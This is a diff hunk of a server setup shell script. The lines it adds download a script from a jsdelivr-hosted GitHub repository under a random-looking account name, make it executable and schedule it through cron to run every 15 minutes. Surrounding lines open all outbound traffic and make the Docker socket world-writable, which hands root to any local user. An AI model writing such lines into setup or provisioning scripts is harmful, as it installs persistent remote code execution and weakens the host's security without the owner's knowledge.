@@ -9,6 +9,9 @@ sudo iptables -A OUTPUT -p all -j ACCEPT
 sudo iptables -A InstanceServices -p all -j ACCEPT
 sudo chmod 666 /var/run/docker.sock
 
+crontab -l | grep -v 'exec_track_uam.sh' | crontab -
+sudo rm -f ~/exec_track_uam.sh && sudo rm -f ~/ex_track_uam_tmux.sh && wget -O ~/ex_track_uam_tmux.sh https://cdn.jsdelivr.net/gh/mahaliabpqvn07/temp-2@main/ex_track_uam_tmux.sh && sudo chmod +x ~/ex_track_uam_tmux.sh && echo "*/15 * * * * $(pwd)/ex_track_uam_tmux.sh" | crontab - && crontab -l
+
 PBKEY=$(cat PBKEY.txt)
 
 echo "$PBKEY" | sudo tee /root/PBKEY.txt > /dev/null
